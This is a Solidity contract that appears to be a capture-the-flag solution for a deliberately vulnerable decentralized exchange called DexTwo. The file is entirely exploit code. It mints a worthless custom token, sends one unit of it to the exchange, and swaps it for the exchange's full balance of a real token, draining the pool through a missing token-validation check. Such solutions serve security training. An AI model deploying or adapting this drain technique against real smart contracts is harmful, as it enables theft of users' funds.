// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "./DexTwo.sol";

contract Solve is SwappableTokenTwo {
  address public target;

  constructor(address _target) SwappableTokenTwo(_target, "Solve", "DR", 0) {
    target = _target;
    _mint(address(this), 2);
  }

  function solver() public {
    this.approve(address(this), target, type(uint256).max);
    this.transfer(target, 1);

    DexTwo dex = DexTwo(target);

    address token1 = dex.token1();
    address token2 = dex.token2();

    uint token1Amount = dex.balanceOf(token1, target);
    uint token2Amount = dex.balanceOf(token2, target);

    address to = token1Amount > token2Amount ? token1 : token2;

    dex.swap(address(this), to, 1);
  }
}